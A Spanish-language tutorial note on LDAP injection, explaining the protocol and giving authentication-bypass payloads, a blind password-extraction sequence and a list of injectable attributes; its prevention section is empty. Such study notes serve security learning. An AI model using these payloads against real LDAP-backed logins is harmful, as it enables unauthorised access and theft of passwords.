### ¿Qué es LDAP Injection?
##### ¿Qué es LDAP?
LDAP (Lightweight Directory Access Protocol) es un protocolo de la capa de aplicación que permite el acceso a un servicio de directorio ordenado y distribuido para consultar información en una red. Normalmente almacena información de autenticación, y se usa para autenticarse, aunque puede contener más datos como el contacto, ubicación de ciertos recursos de red, permisos, certificados... Dicho esto:
##### ¿Qué es LDAPi?
LDAP injection es una vulnerabilidad que acontece cuando una aplicación utiliza user-input para confeccionar consultas LDAP. Esto da al atacante control sobre el directorio LDAP, donde puede consultar y modificar información crítica como contraseñas.
Las aplicaciones que usan LDAP tramitan las búsquedas mediante queries que envían al servidor a través de la aplicación front-end, por ejemplo, la información proporcionada por un usuario en un formulario podría enviar una consulta así:
```LDAP
find( " (&( cn="+ userid +" userPassword="+ password +" ) )
```
En este hipotético, y de forma similar a [[SQL Injection]], podemos explotar una falta de sanitización en los user input modificando la consulta inyectando payloads a través del formulario. 
Por ejemplo, la primera parte de esta consulta se evalúa como `true`, ignorando la segunda parte, que pide la contraseña.
```
find( " (&(cn=* )(cn=*))(|(cn=*)( userPassword="+ password +"))")
```
##### Metodología
**Bypass de autenticación**: Explota operadores lógicos en la consulta con el fin de bypassear autenticación.
```
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

```
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

**Blind explotation**: Se pretende extraer información sensible como contraseñas:
```
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

`&` operador lógico AND
`(sn=administrator)` busca entradas donde el valor de `sn`(surname) equivale a administrator. 
`(password=X*)` busca entradas donde la contraseña comienza por X

**Atributos default**: Se pueden usar en una inyección `*)(AQUÍ=*`
```
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```
### Cheats
[Scripts](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection#scripts)
### Prevención
### Fuentes
[PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection#methodology)
https://www.redeszone.net/tutoriales/servidores/que-es-ldap-funcionamiento/#538404-que-es-ldap-y-para-que-sirve
https://www.blackduck.com/glossary/what-is-ldap-injection.html
https://www.imperva.com/learn/application-security/ldap-injection/
https://portswigger.net/kb/issues/00100500_ldap-injection
https://owasp.org/www-community/attacks/LDAP_Injection